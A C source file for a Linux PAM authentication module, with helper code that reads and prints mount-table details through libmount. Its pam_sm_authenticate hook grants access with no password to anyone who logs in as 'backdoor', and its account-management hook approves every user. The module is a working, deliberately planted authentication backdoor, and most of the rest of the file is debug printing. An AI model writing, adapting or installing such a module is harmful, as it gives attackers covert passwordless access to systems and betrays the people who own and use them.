#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <libmount/libmount.h>
#include <err.h>
#include <ctype.h>

#include "exitcodes.h"

static int volume_is_mounted( char * label );
static int table_parser_errcb(struct libmnt_table *tb,
			const char *filename, int line);
static void safe_fputs(const char *data);
static int mnt_fs_debug(struct libmnt_fs *fs);


/* expected hook */

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	int retval;
	printf("Acct mgmt\n");
	const char* pUser;
	retval = pam_get_user(pamh, &pUser, NULL);
	if( retval == 0 )
		printf("This is  %s\n", pUser);
	if( strcmp(pUser, "root") == 0)
		return PAM_SUCCESS;
	switch( volume_is_mounted("/") ){
		case 0: return PAM_SUCCESS;
		default: return PAM_SUCCESS;
	}
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;

	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}

static int volume_is_mounted( char * label ){
	struct libmnt_context *cxt;
	struct libmnt_table *tb;
	struct libmnt_iter *itr = NULL;
	struct libmnt_fs *fs;
	struct libmnt_cache *cache = NULL;
	cxt = mnt_new_context();
	if (!cxt)
		err(MOUNT_EX_SYSERR, "libmount context allocation failed");


	mnt_context_set_tables_errcb(cxt, table_parser_errcb);

	if (mnt_context_get_mtab(cxt, &tb))
		err(MOUNT_EX_SYSERR, "failed to read mtab");

	itr = mnt_new_iter(MNT_ITER_FORWARD);
	if (!itr)
		err(MOUNT_EX_SYSERR, "failed to initialize libmount iterator");

	cache = mnt_new_cache();
	while (mnt_table_next_fs(tb, itr, &fs) == 0) {
		const char *type = mnt_fs_get_fstype(fs);
		const char *src = mnt_fs_get_source(fs);
		const char *optstr = mnt_fs_get_options(fs);
		char *xsrc = NULL;
		const char *target = NULL;
		const char *srcpath;

		target = mnt_fs_get_target(fs);
		if( strcmp(label, target) != 0)
			continue;
		mnt_fs_debug(fs);
		srcpath = mnt_fs_get_srcpath(fs);
		if (!srcpath) {
			const char *tag, *val;
			if (mnt_fs_get_tag(fs, &tag, &val) == 0)
				printf("%s: %s\n", tag, val);	// LABEL or UUID
		} else{
			printf("device: %s\n", srcpath);		// device or bind path
		}
		if (!mnt_fs_is_pseudofs(fs))
			xsrc = mnt_pretty_path(src, cache);
		printf ("%s on ", xsrc ? xsrc : src);
		safe_fputs(target);

		if (type)
			printf (" type %s", type);
		if (optstr)
			printf (" (%s)", optstr);
		if ( src) {
			char *lb = mnt_cache_find_tag_value(cache, src, "LABEL");
			if (lb)
				printf (" [%s]", lb);
		}
		fputc('\n', stdout);
		printf ("RAW: %s \n", src);
		free(xsrc);
	}

	mnt_unref_cache(cache);
	mnt_free_iter(itr);

	mnt_free_context(cxt);

	printf("%s\n",label);
	return 0;
}

static int table_parser_errcb(struct libmnt_table *tb __attribute__((__unused__)),
			const char *filename, int line)
{
	if (filename)
		warnx("%s: parse error: ignore entry at line %d.",
							filename, line);
	return 0;
}

/*
 * Replace control chars with '?' to be compatible with coreutils. For more
 * robust solution use findmnt(1) where we use \x?? hex encoding.
 */
static void safe_fputs(const char *data)
{
	const char *p;

	for (p = data; p && *p; p++) {
		if (iscntrl((unsigned char) *p))
			fputc('?', stdout);
		else
			fputc(*p, stdout);
	}
}

static int mnt_fs_debug(struct libmnt_fs *fs)
{
	if (!fs )
		return -2;
	printf( "------ fs: %p\n", fs);
	printf( "source: %s\n", mnt_fs_get_source(fs));
	printf( "target: %s\n", mnt_fs_get_target(fs));
	printf( "fstype: %s\n", mnt_fs_get_fstype(fs));

	if (mnt_fs_get_options(fs))
		printf( "optstr: %s\n", mnt_fs_get_options(fs));
	if (mnt_fs_get_vfs_options(fs))
		printf( "VFS-optstr: %s\n", mnt_fs_get_vfs_options(fs));
	if (mnt_fs_get_fs_options(fs))
		printf( "FS-opstr: %s\n", mnt_fs_get_fs_options(fs));
	if (mnt_fs_get_user_options(fs))
		printf( "user-optstr: %s\n", mnt_fs_get_user_options(fs));
	if (mnt_fs_get_optional_fields(fs))
		printf( "optional-fields: '%s'\n", mnt_fs_get_optional_fields(fs));
	if (mnt_fs_get_attributes(fs))
		printf( "attributes: %s\n", mnt_fs_get_attributes(fs));

	if (mnt_fs_get_root(fs))
		printf( "root:   %s\n", mnt_fs_get_root(fs));

	if (mnt_fs_get_swaptype(fs))
		printf( "swaptype: %s\n", mnt_fs_get_swaptype(fs));
	if (mnt_fs_get_size(fs))
		printf( "size: %jd\n", mnt_fs_get_size(fs));
	if (mnt_fs_get_usedsize(fs))
		printf( "usedsize: %jd\n", mnt_fs_get_usedsize(fs));
	if (mnt_fs_get_priority(fs))
		printf( "priority: %d\n", mnt_fs_get_priority(fs));

	if (mnt_fs_get_bindsrc(fs))
		printf( "bindsrc: %s\n", mnt_fs_get_bindsrc(fs));
	if (mnt_fs_get_freq(fs))
		printf( "freq:   %d\n", mnt_fs_get_freq(fs));
	if (mnt_fs_get_passno(fs))
		printf( "pass:   %d\n", mnt_fs_get_passno(fs));
	if (mnt_fs_get_id(fs))
		printf( "id:     %d\n", mnt_fs_get_id(fs));
	if (mnt_fs_get_parent_id(fs))
		printf( "parent: %d\n", mnt_fs_get_parent_id(fs));
	if (mnt_fs_get_devno(fs))
		printf( "devno:  %d:%d\n", major(mnt_fs_get_devno(fs)),
						minor(mnt_fs_get_devno(fs)));
	if (mnt_fs_get_tid(fs))
		printf( "tid:    %d\n", mnt_fs_get_tid(fs));
	if (mnt_fs_get_comment(fs))
		printf( "comment: '%s'\n", mnt_fs_get_comment(fs));

	return 0;
}
